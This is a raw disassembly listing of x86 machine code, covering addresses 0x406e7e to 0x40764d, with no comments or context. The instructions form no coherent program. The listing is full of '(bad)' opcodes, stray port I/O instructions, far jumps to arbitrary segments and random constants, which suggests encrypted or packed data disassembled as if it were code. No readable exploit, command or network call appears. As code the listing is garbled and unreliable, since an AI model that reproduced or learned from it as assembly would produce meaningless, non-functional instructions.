  406e7e:	outs   dx,DWORD PTR ds:[esi]
  406e7f:	pusha  
  406e80:	and    eax,0x92645295
  406e85:	or     DWORD PTR [ebx],esi
  406e87:	ins    BYTE PTR es:[edi],dx
  406e88:	inc    edi
  406e89:	retf   0x5022
  406e8c:	xchg   ebp,eax
  406e8d:	stos   BYTE PTR es:[edi],al
  406e8e:	fs mov ah,0xe6
  406e91:	out    dx,eax
  406e92:	clc    
  406e93:	sub    al,0x7
  406e95:	dec    edx
  406e96:	gs nop
  406e98:	push   ebx
  406e99:	ret    
  406e9a:	stos   BYTE PTR es:[edi],al
  406e9b:	lds    ebx,FWORD PTR [edx+ebx*4]
  406e9e:	cld    
  406e9f:	pop    esi
  406ea0:	fsubr  DWORD PTR [edx-0x30]
  406ea3:	or     DWORD PTR fs:[ebx-0x4da8105c],ebx
  406eaa:	sub    al,0x1e
  406eac:	aas    
  406ead:	mov    DWORD PTR [edi+ecx*1-0xf],ebp
  406eb1:	(bad)  
  406eb2:	pop    ss
  406eb3:	pop    esi
  406eb4:	cmp    ebp,edi
  406eb6:	mov    edi,DWORD PTR [eax]
  406eb8:	jb     0x406ebd
  406eba:	push   edi
  406ebb:	stc    
  406ebc:	sub    eax,0xe9bd00b3
  406ec1:	mov    eax,ds
  406ec3:	(bad)  
  406ec4:	jmp    0xa67e:0x418d8b58
  406ecb:	cmp    eax,0xb2de493e
  406ed0:	ins    BYTE PTR es:[edi],dx
  406ed1:	jg     0x406ecf
  406ed3:	or     BYTE PTR [esi-0x7465d5fc],0xa
  406eda:	inc    ebx
  406edb:	pop    edi
  406edc:	sahf   
  406edd:	cmp    eax,0xceb16169
  406ee2:	ror    esi,0x20
  406ee5:	es push 0xba8ba221
  406eeb:	dec    ebx
  406eec:	xchg   edx,eax
  406eed:	cmp    bl,BYTE PTR [si-0x26]
  406ef1:	fcomp  DWORD PTR [esi]
  406ef3:	cmc    
  406ef4:	sbb    al,0x74
  406ef6:	cmp    DWORD PTR [edi],edx
  406ef8:	out    dx,al
  406ef9:	mov    WORD PTR [ecx],ss
  406efb:	xchg   esi,eax
  406efc:	lods   eax,DWORD PTR ds:[esi]
  406efd:	sbb    eax,DWORD PTR [ebx-0x36]
  406f00:	inc    eax
  406f01:	retf   0x5a11
  406f04:	inc    ebx
  406f05:	jge    0x406e99
  406f07:	xor    BYTE PTR [ebp+0x72],al
  406f0a:	mov    gs,WORD PTR [ebx+eax*4+0x79]
  406f0e:	xchg   dh,dl
  406f10:	xor    BYTE PTR [ebx],0xbf
  406f13:	test   BYTE PTR [edi],ah
  406f15:	and    esp,edi
  406f17:	loop   0x406f57
  406f19:	adc    esi,DWORD PTR [edx]
  406f1b:	inc    edi
  406f1c:	mov    al,0xbc
  406f1e:	and    DWORD PTR [edx-0x80],ecx
  406f21:	sbb    DWORD PTR [edi],eax
  406f23:	mov    al,ds:0x6f19b38
  406f28:	add    al,0x99
  406f2a:	push   0x11
  406f2c:	pushf  
  406f2d:	mov    esi,0xf7aeec2a
  406f32:	scas   eax,DWORD PTR es:[edi]
  406f33:	push   edx
  406f34:	push   ss
  406f35:	push   edi
  406f36:	adc    eax,0x4412fdd1
  406f3b:	sub    BYTE PTR gs:[edx+0x515e4cdf],ch
  406f42:	inc    edi
  406f43:	aad    0x1a
  406f45:	ds push ss
  406f47:	aad    0x5a
  406f49:	cmc    
  406f4a:	retf   0x1a4
  406f4d:	jg     0x406f5f
  406f4f:	mov    al,0x48
  406f51:	pop    esp
  406f52:	push   esi
  406f53:	xchg   ecx,eax
  406f54:	sbb    cl,BYTE PTR [ebx]
  406f56:	sub    ebx,DWORD PTR [edi+0x76]
  406f59:	push   0x764a6469
  406f5e:	jb     0x406ee9
  406f60:	sub    ebx,DWORD PTR [esp+edi*4+0x18159a95]
  406f67:	mov    DWORD PTR fs:[esi],ecx
  406f6a:	pop    ebx
  406f6b:	lahf   
  406f6c:	mov    esi,0x4c931437
  406f71:	mov    eax,0x480bf334
  406f76:	push   ds
  406f77:	jg     0x406f2c
  406f79:	cmp    edi,ebp
  406f7b:	test   eax,0xad47784f
  406f80:	fsubr  QWORD PTR [eax]
  406f82:	jge    0x406fc9
  406f84:	xchg   dl,dl
  406f86:	adc    DWORD PTR [ecx-0x7d0b370],0xffffffa8
  406f8d:	sub    BYTE PTR [ebx-0x63],bh
  406f90:	popf   
  406f91:	retf   
  406f92:	ficomp DWORD PTR [ecx+0xf]
  406f95:	paddw  mm3,QWORD PTR [eax+0x5782766b]
  406f9c:	outs   dx,DWORD PTR ds:[esi]
  406f9d:	icebp  
  406f9e:	out    dx,al
  406f9f:	xor    esi,DWORD PTR [edi+esi*1-0x11f65fa2]
  406fa6:	js     0x406fd2
  406fa8:	shl    DWORD PTR [ebx+edi*1],cl
  406fab:	mov    ds:0x2899fc4e,al
  406fb0:	mov    bl,0x73
  406fb2:	mov    dh,0x64
  406fb4:	(bad)  
  406fb5:	jecxz  0x407011
  406fb7:	imul   ebx,DWORD PTR [esi-0x21a3559],0x434058dc
  406fc1:	shl    ch,1
  406fc3:	jb     0x407034
  406fc5:	xchg   ebx,eax
  406fc6:	shr    DWORD PTR [esi+ecx*2],cl
  406fc9:	in     al,dx
  406fca:	add    edx,DWORD PTR [ebp+0x7c]
  406fcd:	(bad)  
  406fce:	pushf  
  406fcf:	mov    BYTE PTR [eax-0x55],al
  406fd2:	lods   al,BYTE PTR ds:[esi]
  406fd3:	fcomp  DWORD PTR ds:0xff1c51c2
  406fd9:	push   esi
  406fda:	out    dx,eax
  406fdb:	aam    0x53
  406fdd:	mov    ebx,0x7a9c5058
  406fe2:	inc    ecx
  406fe3:	lahf   
  406fe4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fe6:	adc    ch,BYTE PTR [edi-0x604db8ef]
  406fec:	pop    ebx
  406fed:	inc    edi
  406fee:	pusha  
  406fef:	jmp    FWORD PTR [eax]
  406ff1:	(bad)  
  406ff2:	dec    edi
  406ff3:	add    al,0x61
  406ff5:	add    al,BYTE PTR ds:0xa31c3b1d
  406ffb:	jb     0x406f82
  406ffd:	sbb    eax,0x6bca1c0d
  407002:	ficomp WORD PTR [edx-0x7011ae5f]
  407008:	xor    cl,BYTE PTR ds:[ebx]
  40700b:	or     BYTE PTR [ebx],cl
  40700d:	sahf   
  40700e:	ja     0x406fd8
  407010:	sub    DWORD PTR [edi-0x59],edi
  407013:	add    eax,0x353a3b31
  407018:	cmp    eax,0xd821730a
  40701d:	test   eax,0x772ef2b7
  407022:	retf   
  407023:	outs   dx,DWORD PTR ds:[esi]
  407024:	cwde   
  407025:	dec    edx
  407026:	add    al,BYTE PTR [ebp-0x80]
  407029:	jns    0x40706a
  40702b:	ins    DWORD PTR es:[edi],dx
  40702c:	popf   
  40702d:	add    eax,0x3eb80988
  407032:	and    eax,DWORD PTR [ebx]
  407034:	jnp    0x407089
  407036:	(bad)  
  407037:	mov    eax,DWORD PTR [ebp+0x1b]
  40703a:	mov    ebp,0x970d898b
  40703f:	jbe    0x40700e
  407041:	mov    eax,ds:0x6f4a91a8
  407046:	cmc    
  407047:	(bad)  
  40704b:	(bad)  
  40704d:	in     al,0xdb
  40704f:	push   0x5
  407051:	mov    ebp,0x8e30087a
  407056:	jge    0x4070b8
  407058:	cs shl bl,0x40
  40705c:	sar    BYTE PTR [ebp+0x568ebff7],0xb
  407063:	and    BYTE PTR [ebp+0x2497b1e5],cl
  407069:	retf   
  40706a:	inc    esi
  40706b:	sti    
  40706c:	(bad)  
  40706e:	push   esi
  40706f:	out    dx,al
  407070:	mov    ds:0x82ff7abe,al
  407075:	push   cs
  407076:	jns    0x4070d0
  407078:	fst    DWORD PTR [ebx+0x12f99dab]
  40707e:	push   edx
  40707f:	dec    ebp
  407080:	jle    0x4070cf
  407082:	pop    edi
  407083:	or     bl,BYTE PTR [esi-0x3f2e90cb]
  407089:	out    0x89,al
  40708b:	cs imul edi,edx,0xffffffcd
  40708f:	xor    DWORD PTR [edi+0x64e930d3],ebp
  407095:	dec    eax
  407096:	(bad)  
  407097:	xor    edx,DWORD PTR [ebx+0x20]
  40709a:	mov    esi,0x97c00f5b
  40709f:	xor    al,0x4
  4070a1:	xor    edi,DWORD PTR [edi-0x2c]
  4070a4:	cmp    dh,BYTE PTR [ecx+0x6]
  4070a7:	popa   
  4070a8:	fst    QWORD PTR [esp+esi*1+0x70c43357]
  4070af:	jge    0x4070e6
  4070b1:	and    ebx,edi
  4070b3:	call   0xd944:0xe69c1616
  4070ba:	inc    esp
  4070bb:	iret   
  4070bc:	cli    
  4070bd:	or     DWORD PTR [ecx],0x367082ea
  4070c3:	mov    ebp,DWORD PTR [edi+0x658de7ce]
  4070c9:	mov    ecx,0xb7fe01d3
  4070ce:	or     BYTE PTR [eax+0x46b6ea6d],0x15
  4070d5:	jo     0x407068
  4070d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070d8:	inc    eax
  4070d9:	sahf   
  4070da:	call   0xd71d:0x7696d801
  4070e1:	cmp    dl,BYTE PTR [edx-0x7e]
  4070e4:	aaa    
  4070e5:	push   eax
  4070e6:	mov    ecx,0xdf84abfc
  4070eb:	sub    ah,BYTE PTR [ebp-0x50]
  4070ee:	fidivr DWORD PTR [eax-0x4cc73021]
  4070f4:	dec    edi
  4070f5:	lock cmp al,0xa8
  4070f8:	push   ecx
  4070f9:	mov    al,ds:0xf6a06ddc
  4070fe:	nop
  4070ff:	sti    
  407100:	bound  ebx,QWORD PTR [ecx+0x761e888a]
  407106:	cmp    ah,BYTE PTR [eax]
  407108:	and    al,0x15
  40710a:	inc    eax
  40710b:	and    edx,eax
  40710d:	mov    ds,ebp
  40710f:	mov    bh,0x30
  407111:	dec    ebp
  407112:	add    DWORD PTR [eax+eax*2-0x5b2ab18a],edx
  407119:	sbb    DWORD PTR [edi],0xd388e02f
  40711f:	loop   0x4070db
  407121:	xchg   edx,eax
  407122:	add    BYTE PTR [ebp-0x4dbff4cf],ch
  407128:	cmp    al,0xf0
  40712a:	and    DWORD PTR [ecx+0x70],esi
  40712d:	retf   
  40712e:	rol    DWORD PTR [eax-0x43b261fe],0x9a
  407135:	mov    dl,0x67
  407137:	aas    
  407138:	lods   eax,DWORD PTR ds:[esi]
  407139:	out    dx,eax
  40713a:	das    
  40713b:	xlat   BYTE PTR ds:[ebx]
  40713c:	retf   
  40713d:	dec    edi
  40713e:	arpl   cx,bp
  407140:	leave  
  407141:	xchg   esi,eax
  407142:	dec    ebp
  407143:	fldcw  WORD PTR [edx+ebx*8-0xd]
  407147:	arpl   di,cx
  407149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40714a:	xor    eax,0xa52cac28
  40714f:	or     ah,BYTE PTR [eax-0x3c]
  407152:	or     BYTE PTR [edi],ch
  407154:	mov    bl,0x62
  407156:	ins    DWORD PTR es:[edi],dx
  407157:	in     eax,0x53
  407159:	(bad)  
  40715a:	push   edi
  40715b:	mov    DWORD PTR [ebx+eiz*8+0x38],ebp
  40715f:	mov    ebp,0xa55d61be
  407164:	fiadd  WORD PTR [ebp-0x64c56b8a]
  40716a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40716b:	pushf  
  40716c:	lods   eax,DWORD PTR ds:[esi]
  40716d:	mov    ds:0x1a15b3f8,eax
  407172:	rol    BYTE PTR [edi+0x451a5af5],0x33
  407179:	adc    eax,0xdb956883
  40717e:	mov    eax,ds:0xee2792d6
  407183:	sti    
  407184:	xchg   esi,eax
  407185:	lods   eax,DWORD PTR ds:[esi]
  407186:	outs   dx,BYTE PTR ds:[esi]
  407187:	out    dx,eax
  407188:	xchg   edi,eax
  407189:	(bad)  
  40718a:	out    0x99,al
  40718c:	xor    BYTE PTR [ebx-0x1f5d3e22],0x2f
  407193:	ror    BYTE PTR [ecx+0x37],0x22
  407197:	add    ebp,ecx
  407199:	(bad)
  40719c:	push   edx
  40719d:	adc    eax,0x496fea58
  4071a2:	lahf   
  4071a3:	jecxz  0x407214
  4071a5:	push   esp
  4071a6:	push   ss
  4071a7:	xor    eax,0xbd7744b1
  4071ac:	xchg   edi,eax
  4071ad:	push   ds
  4071ae:	and    bh,ah
  4071b0:	dec    eax
  4071b1:	cmp    BYTE PTR [esi+0x138fd73e],bh
  4071b7:	push   esi
  4071b8:	mov    ch,0x5b
  4071ba:	das    
  4071bb:	inc    ebx
  4071bc:	xor    dh,bl
  4071be:	pusha  
  4071bf:	push   cs
  4071c0:	cwde   
  4071c1:	cld    
  4071c2:	sbb    esi,DWORD PTR ds:[esi+0x7b0dea3c]
  4071c9:	outs   dx,DWORD PTR ds:[esi]
  4071ca:	imul   eax,ebp,0xffffffd4
  4071cd:	adc    eax,0xde240171
  4071d2:	and    al,0xc7
  4071d4:	rol    DWORD PTR [edx],1
  4071d6:	sbb    ecx,DWORD PTR [esi+0x13c9c5fe]
  4071dc:	inc    ebx
  4071dd:	mov    ?,eax
  4071df:	mov    ecx,0x92ba50ad
  4071e4:	outs   dx,BYTE PTR ds:[esi]
  4071e5:	ret    0xe9c
  4071e8:	aaa    
  4071e9:	addr16 jb 0x40716c
  4071ec:	inc    ecx
  4071ed:	test   DWORD PTR [ecx],ebp
  4071ef:	stos   BYTE PTR es:[edi],al
  4071f0:	pop    edx
  4071f1:	ins    BYTE PTR es:[edi],dx
  4071f2:	or     bl,BYTE PTR [esi+eax*8+0x33dd651]
  4071f9:	mov    esi,0x46bcb519
  4071fe:	mov    al,0x3e
  407200:	in     al,dx
  407201:	pop    ebp
  407202:	je     0x4071d2
  407204:	mov    WORD PTR [ecx+0x7c],es
  407207:	(bad)  
  407208:	pop    ebx
  407209:	mov    DWORD PTR [eax+0x2a],ebp
  40720c:	pop    ss
  40720d:	loopne 0x40724e
  40720f:	ins    BYTE PTR es:[edi],dx
  407210:	jnp    0x407291
  407212:	mov    ebp,0x5c19df55
  407217:	sub    DWORD PTR [edi+0x10a5c31c],edi
  40721d:	mov    bh,0x2e
  40721f:	mov    eax,0x2daee012
  407224:	shl    DWORD PTR [edx],cl
  407226:	mov    edx,0x48ff8172
  40722b:	aad    0xc8
  40722d:	inc    DWORD PTR [ebx+0x16]
  407230:	xchg   eax,edx
  407232:	dec    ebp
  407233:	stos   BYTE PTR es:[edi],al
  407234:	jmp    0xfa86:0x9a44ae09
  40723b:	inc    ebp
  40723c:	enter  0x56d6,0x77
  407240:	push   ds
  407241:	jno    0x40728d
  407243:	sub    DWORD PTR [eax-0x2759471e],esp
  407249:	jmp    0x3be:0x7b853c60
  407250:	popf   
  407251:	test   DWORD PTR [ecx],eax
  407253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407254:	cmp    ch,dl
  407256:	ja     0x40726f
  407258:	and    DWORD PTR [edi],edi
  40725a:	or     ch,BYTE PTR [si]
  40725d:	fcom   QWORD PTR [ecx]
  40725f:	sub    BYTE PTR [ecx],0x53
  407262:	mov    bl,0x38
  407264:	jo     0x407223
  407266:	mov    ebx,0xb0871358
  40726b:	dec    edi
  40726c:	cmp    ch,0x11
  40726f:	mov    al,ds:0xc2b49414
  407274:	inc    edx
  407275:	lods   al,BYTE PTR ds:[esi]
  407276:	add    eax,0x638ea53f
  40727b:	push   ds
  40727c:	push   edi
  40727d:	(bad)  ds:0xca8b9144
  407283:	cmp    BYTE PTR [edx],cl
  407285:	jmp    0x7d6e:0x6f1f9aa4
  40728c:	ret    0x38a0
  40728f:	push   0xde47a4a9
  407294:	popf   
  407295:	add    ah,BYTE PTR [eax-0x12]
  407298:	ja     0x407246
  40729a:	pop    ss
  40729b:	hlt    
  40729c:	js     0x4072cc
  40729e:	nop
  40729f:	cmp    eax,DWORD PTR [ebp+0x1]
  4072a2:	(bad)  
  4072a3:	rol    bh,0xf3
  4072a6:	ja     0x407269
  4072a8:	mov    ebp,DWORD PTR [ebp-0x4b]
  4072ab:	and    DWORD PTR [esi+0x22],esp
  4072ae:	fstp   st(6)
  4072b0:	xor    al,0xbb
  4072b2:	nop
  4072b3:	jo     0x4072fc
  4072b5:	pop    esp
  4072b6:	cmp    al,0x8f
  4072b8:	sbb    DWORD PTR [ecx-0x5f],edx
  4072bb:	pop    esp
  4072bc:	je     0x40726c
  4072be:	(bad)  
  4072bf:	neg    al
  4072c1:	push   0xfffffffc
  4072c3:	ins    BYTE PTR es:[edi],dx
  4072c4:	in     al,0x53
  4072c6:	jo     0x4072ac
  4072c8:	ror    DWORD PTR [edi+eax*4-0x17a524c0],1
  4072cf:	cmp    bh,dh
  4072d1:	push   ebp
  4072d2:	repz mov dl,0xb6
  4072d5:	in     eax,0x4f
  4072d7:	lock jecxz 0x4072d1
  4072da:	aam    0x70
  4072dc:	or     al,0x2e
  4072de:	xchg   ebp,eax
  4072df:	mov    edi,0x217c982a
  4072e4:	data16 sub cl,BYTE PTR [eax-0x7b]
  4072e8:	ss jecxz 0x4072fa
  4072eb:	outs   dx,BYTE PTR ds:[esi]
  4072ec:	jmp    0x88c2:0xd419bd77
  4072f3:	push   ebx
  4072f4:	add    BYTE PTR [edi],bh
  4072f6:	and    DWORD PTR [edi+0x63],ebx
  4072f9:	mov    al,ds:0x65362360
  4072fe:	push   esp
  4072ff:	retf   0x5d03
  407302:	mov    al,0x80
  407304:	out    dx,eax
  407305:	mov    dh,0x5e
  407307:	cdq    
  407308:	and    dl,al
  40730a:	sub    bl,0x3f
  40730d:	fnstenv [ecx-0x5b]
  407310:	sbb    edi,DWORD PTR [esi-0x44e1f0da]
  407316:	popf   
  407317:	mov    edx,ss
  407319:	dec    esi
  40731a:	adc    eax,0xdaac7691
  40731f:	leave  
  407320:	mov    eax,0x62637f8e
  407325:	es iret 
  407327:	outs   dx,BYTE PTR ds:[esi]
  407328:	adc    eax,0x873cafe4
  40732d:	xor    dl,cl
  40732f:	test   dl,al
  407331:	pop    ss
  407332:	sub    BYTE PTR [edx+0x5d543b4c],dh
  407338:	fcom   st(6)
  40733a:	jns    0x40735b
  40733c:	mov    ah,0x5f
  40733e:	ret    0x31cc
  407341:	mov    ah,0x56
  407343:	cwde   
  407344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407345:	leave  
  407346:	popf   
  407347:	imul   esi,DWORD PTR [ecx+0xf85da07],0x75
  40734e:	adc    bl,BYTE PTR [ebp-0x437c133a]
  407354:	dec    ebp
  407355:	xchg   esp,eax
  407356:	cmp    bh,BYTE PTR [ebp-0x7e]
  407359:	inc    ebp
  40735a:	mov    al,0xdc
  40735c:	cli    
  40735d:	push   eax
  40735e:	jbe    0x4072fa
  407360:	cwde   
  407361:	or     eax,0x2f2a2da6
  407366:	mov    al,0xe6
  407368:	stos   BYTE PTR es:[edi],al
  407369:	ins    BYTE PTR es:[edi],dx
  40736a:	ja     0x40734b
  40736c:	jmp    0x446db7b2
  407371:	add    al,0xc4
  407373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407375:	add    BYTE PTR [ebx],cl
  407377:	out    0x4b,eax
  407379:	mov    dl,0xd1
  40737b:	(bad)  
  40737c:	and    al,0x22
  40737e:	dec    ebx
  40737f:	push   edi
  407380:	rol    DWORD PTR [ebx-0x26a195d8],0xe6
  407387:	push   edi
  407388:	or     WORD PTR [ebx+0x70],cx
  40738c:	mov    ecx,0xb432915f
  407391:	and    eax,0x815a40f9
  407396:	(bad)  
  407397:	cmp    DWORD PTR [eax+0x5fe1a104],esi
  40739d:	pop    es
  40739e:	test   al,0x9b
  4073a0:	mov    ch,0x2b
  4073a2:	inc    esi
  4073a3:	mov    DWORD PTR [esi-0x1],0x310911b6
  4073aa:	(bad)  
  4073ab:	push   ds
  4073ac:	gs mov gs,edx
  4073af:	mov    cl,0xee
  4073b1:	push   ss
  4073b2:	lea    ebx,[edi-0x58]
  4073b5:	sub    al,0xab
  4073b7:	sub    BYTE PTR [edx],al
  4073b9:	xchg   ebx,eax
  4073ba:	les    esi,FWORD PTR [edx]
  4073bc:	sub    DWORD PTR [edi],0x7f
  4073bf:	cmp    edx,eax
  4073c1:	mov    al,ds:0xc64a707a
  4073c6:	and    esp,DWORD PTR [ebp+0x17]
  4073c9:	cli    
  4073ca:	ins    DWORD PTR es:[edi],dx
  4073cb:	jo     0x40740d
  4073cd:	loopne 0x407378
  4073cf:	data16 scas al,BYTE PTR es:[edi]
  4073d1:	push   ss
  4073d2:	les    ebp,FWORD PTR [ebx]
  4073d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073d5:	mov    eax,DWORD PTR [edx+0x72]
  4073d8:	dec    ebx
  4073d9:	sahf   
  4073da:	sbb    eax,0x778f25e5
  4073df:	xor    bl,0x2d
  4073e2:	sub    BYTE PTR [edi],bh
  4073e4:	xor    eax,0x33adc9d1
  4073e9:	stos   DWORD PTR es:[edi],eax
  4073ea:	pop    edi
  4073eb:	mov    eax,ds:0xd8107f6
  4073f0:	jo     0x4073e8
  4073f2:	mov    esi,0xaed86fec
  4073f7:	lods   al,BYTE PTR ds:[esi]
  4073f8:	and    dl,BYTE PTR [edi-0x342fd6a0]
  4073fe:	mov    ds:0x343a9d29,al
  407403:	sbb    ecx,edx
  407405:	cmp    DWORD PTR [eax],edi
  407407:	in     al,dx
  407408:	mov    ebp,0xcafad59
  40740d:	mov    cl,0xb4
  40740f:	xor    DWORD PTR [edi+ebx*4+0x55],esp
  407413:	adc    eax,ecx
  407415:	cs enter 0x9e91,0xee
  40741a:	enter  0xd06b,0x1e
  40741e:	test   DWORD PTR [esi+0x23f6845b],esp
  407424:	mov    esi,DWORD PTR [eax]
  407426:	aam    0x68
  407428:	dec    esi
  407429:	pusha  
  40742a:	sbb    BYTE PTR [esi-0x6379b9e7],bh
  407430:	mov    ebp,0x39404173
  407435:	push   ds
  407436:	into   
  407437:	rcl    BYTE PTR [esi],0xb6
  40743a:	(bad)  
  40743b:	mov    ebx,0xb1294e1a
  407440:	mov    cl,0xd0
  407442:	adc    bl,BYTE PTR [edx+0x3f]
  407445:	(bad)  
  407446:	or     DWORD PTR [eax+0x3a],esi
  407449:	pushf  
  40744a:	xchg   DWORD PTR [ebp+0x27],ebp
  40744d:	push   0x7
  40744f:	jne    0x407499
  407451:	jnp    0x40747a
  407453:	mov    dl,0x84
  407455:	xchg   edi,eax
  407456:	dec    ebp
  407457:	pop    edi
  407458:	or     dl,0x8f
  40745b:	jl     0x40743e
  40745d:	(bad)  
  40745e:	lods   eax,DWORD PTR ds:[esi]
  40745f:	loop   0x407456
  407461:	xor    ch,0xd3
  407464:	outs   dx,DWORD PTR ds:[esi]
  407465:	inc    ebx
  407466:	pushf  
  407467:	cld    
  407468:	xor    dl,BYTE PTR [ecx-0x53508f6c]
  40746e:	adc    dl,dh
  407470:	mov    eax,0xbbbbdbda
  407475:	mov    eax,0x143b4c68
  40747a:	cmp    esi,DWORD PTR [edx-0x285bbd58]
  407480:	ins    DWORD PTR es:[edi],dx
  407481:	mov    eax,0x29956db4
  407486:	or     BYTE PTR [edx-0x63],al
  407489:	sti    
  40748a:	lea    ebp,[esi-0x1d]
  40748d:	ret    0xd792
  407490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407491:	pop    esp
  407492:	jmp    0x84f6:0x31fc9977
  407499:	adc    esp,esp
  40749b:	es cs (bad) 
  40749e:	pusha  
  40749f:	dec    ebx
  4074a0:	lea    esi,[ebx+ebp*2]
  4074a3:	xchg   ch,ch
  4074a5:	adc    esi,eax
  4074a7:	push   ebx
  4074a8:	test   dl,bl
  4074aa:	mov    edx,DWORD PTR [ecx+0x66]
  4074ad:	lds    edx,FWORD PTR [ebx+ebx*8-0x4c]
  4074b1:	push   edx
  4074b2:	ja     0x407511
  4074b4:	inc    esp
  4074b5:	adc    BYTE PTR [edx+edi*2+0x67],cl
  4074b9:	fnsave [ecx+edx*8]
  4074bc:	cmp    eax,0xe2e968da
  4074c1:	cmp    ebp,ecx
  4074c3:	push   0xfffffffe
  4074c5:	in     eax,dx
  4074c6:	cld    
  4074c7:	inc    eax
  4074c8:	and    BYTE PTR [ebp-0x871da54],al
  4074ce:	pop    ebx
  4074cf:	xchg   DWORD PTR cs:[edi],ebp
  4074d2:	into   
  4074d3:	sti    
  4074d4:	sbb    al,BYTE PTR [ecx-0x76]
  4074d7:	xor    al,0x58
  4074d9:	inc    ecx
  4074da:	fs sti 
  4074dc:	iret   
  4074dd:	or     BYTE PTR [ebx-0x6f],0x1e
  4074e1:	jbe    0x407475
  4074e3:	mov    DWORD PTR [edx-0x24],0xb8a8ce3c
  4074ea:	aaa    
  4074eb:	nop
  4074ec:	adc    esp,DWORD PTR [edx]
  4074ee:	jge    0x4074ed
  4074f0:	aaa    
  4074f1:	pop    eax
  4074f2:	sbb    DWORD PTR [eax+0x48bf82b3],edi
  4074f8:	daa    
  4074f9:	shr    BYTE PTR [eax],1
  4074fb:	jle    0x40748d
  4074fd:	fisub  DWORD PTR [ebp-0x7b]
  407500:	mov    eax,ds:0x721353a3
  407505:	ja     0x40752f
  407507:	jae    0x407540
  407509:	sbb    eax,0x306fddf6
  40750e:	jmp    0xc1fa:0x9aa7bf3b
  407515:	pop    ebx
  407516:	cmp    al,0xa3
  407518:	std    
  407519:	pop    ebp
  40751a:	xchg   ebp,eax
  40751b:	push   edi
  40751c:	cmp    eax,0xb0179d17
  407521:	int3   
  407522:	pop    edx
  407523:	adc    eax,0xc5e5985d
  407528:	lock dec esp
  40752a:	inc    eax
  40752b:	scas   al,BYTE PTR es:[edi]
  40752c:	pop    ebp
  40752d:	sub    al,0xe5
  40752f:	out    0x7c,al
  407531:	dec    ecx
  407533:	bound  esp,QWORD PTR ds:0x7cb97a94
  407539:	xchg   BYTE PTR [esi],ch
  40753b:	sahf   
  40753c:	into   
  40753d:	sahf   
  40753e:	dec    esp
  40753f:	adc    eax,0x37807001
  407544:	dec    edi
  407545:	or     edx,edx
  407547:	mov    al,ds:0x6568c907
  40754c:	dec    edx
  40754d:	ds push edi
  40754f:	push   ss
  407550:	adc    al,0x2f
  407552:	inc    esi
  407553:	sub    eax,0xe7cd1d31
  407558:	mov    edi,0x1f993b50
  40755d:	jno    0x4075b1
  40755f:	sub    DWORD PTR [edi+0x24],edx
  407562:	loop   0x407504
  407564:	pop    ds
  407565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407566:	sti    
  407567:	inc    esi
  407568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407569:	pop    eax
  40756a:	scas   al,BYTE PTR es:[edi]
  40756b:	adc    al,0xa3
  40756d:	leave  
  40756e:	jno    0x40753f
  407570:	mov    BYTE PTR [edi],bh
  407572:	mov    bl,0x34
  407574:	jnp    0x4075d3
  407576:	jne    0x40753a
  407578:	cdq    
  407579:	or     al,BYTE PTR [esi+eiz*1]
  40757c:	mov    dh,0x56
  40757e:	xor    DWORD PTR ds:0x6536cbfe,ebx
  407584:	retf   
  407585:	add    eax,0xcfe53bcf
  40758a:	xchg   esp,eax
  40758b:	sub    al,bl
  40758d:	dec    edi
  40758e:	inc    eax
  40758f:	loop   0x4075bb
  407591:	lods   al,BYTE PTR ds:[esi]
  407592:	imul   esp,eax,0xeffeffa0
  407598:	adc    BYTE PTR [ebx+0x67448ff],0x81
  40759f:	les    esp,FWORD PTR [edx]
  4075a1:	in     eax,0x69
  4075a3:	mov    dh,0x11
  4075a5:	xchg   dl,bl
  4075a7:	pop    eax
  4075a8:	fs dec ebp
  4075aa:	loop   0x4075a7
  4075ac:	adc    edi,esp
  4075ae:	mov    ds:0x5b2c3446,al
  4075b3:	pop    esp
  4075b4:	imul   ecx,DWORD PTR ds:0x2e65914d,0xffffffa9
  4075bb:	inc    ebp
  4075bc:	pop    eax
  4075bd:	add    eax,0xceb7e86e
  4075c2:	sbb    DWORD PTR [esi-0x6],eax
  4075c5:	sub    BYTE PTR [edi-0x1c1b3be0],dh
  4075cb:	add    BYTE PTR [ecx],dl
  4075cd:	sbb    dl,BYTE PTR [edi-0x29080dd2]
  4075d3:	shr    BYTE PTR [edi],0x89
  4075d6:	cmc    
  4075d7:	sub    al,0xb8
  4075d9:	ss in  eax,0xe7
  4075dc:	pop    eax
  4075dd:	mov    ebp,0x6ed6502a
  4075e2:	add    ecx,DWORD PTR [esi-0x56]
  4075e5:	sub    ecx,ebx
  4075e7:	lea    bp,[eax]
  4075ea:	cmp    dh,BYTE PTR [ecx-0x50]
  4075ed:	push   esp
  4075ee:	pusha  
  4075ef:	fcomp  QWORD PTR [eax]
  4075f1:	ja     0x407606
  4075f3:	mov    ah,0xb2
  4075f5:	shl    BYTE PTR [edi-0x24c0e6ec],1
  4075fb:	aaa    
  4075fc:	mov    WORD PTR [eax-0x67ab63e],?
  407602:	(bad)  
  407603:	mov    ebx,0x65c969a2
  407608:	sbb    eax,0xc0d23549
  40760d:	shl    ah,cl
  40760f:	jnp    0x40760a
  407611:	repnz enter 0xbd25,0x49
  407616:	xchg   dl,dl
  407618:	jp     0x40766b
  40761a:	sbb    cl,BYTE PTR [edi+ebx*8-0x1b5d4ff8]
  407621:	jp     0x407661
  407623:	xchg   esp,eax
  407624:	xor    al,0x51
  407626:	push   edi
  407627:	jns    0x4075e1
  407629:	and    BYTE PTR [ebx-0x7d],dl
  40762c:	arpl   WORD PTR [edi+0x5341693b],bx
  407632:	add    esp,ecx
  407634:	out    0x8e,al
  407636:	mov    DWORD PTR es:0x7628a101,esi
  40763d:	push   edx
  40763e:	xchg   esp,eax
  40763f:	jmp    0xd663084a
  407644:	lock hlt 
  407646:	aaa    
  407647:	pop    es
  407648:	fst    QWORD PTR [ecx+0x51]
  40764b:	(bad)  
  40764d:	add    ebp,DWORD PTR [ebx-0x6d]
